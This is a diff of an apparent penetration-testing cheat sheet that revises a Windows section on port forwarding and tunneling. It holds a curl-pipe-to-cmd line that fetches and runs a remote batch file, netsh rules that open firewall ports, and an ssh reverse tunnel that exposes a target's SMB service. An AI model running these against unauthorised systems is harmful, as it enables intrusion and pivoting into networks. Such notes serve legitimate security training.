@@ -109,11 +109,11 @@ ____
     curl http://server/file -o file
     curl http://server/file.bat | cmd
  ____   
- # Port Forwarding
- Expose internal services, usually hidden due to firewall rules. 
-     netsh advfirewall firewall show config 
-     netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT 
-     
+ # Port Forwarding / Tunneling
+ Expose internal services, usually hidden due to firewall rules or gain further access into a network. 
+ If pivot is a Linux box with python installed you can ssh into: can use [sshuttle](https://github.com/sshuttle/sshuttle) to connect into network. 
+     netsh firewall show config 
+     netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT      
 ## SSH (Window 10 and newer)
      [from target box to expose SMB ]
      ssh -l user -pw password -R 445:127.0.0.1:445 YOURIPADDRESS 
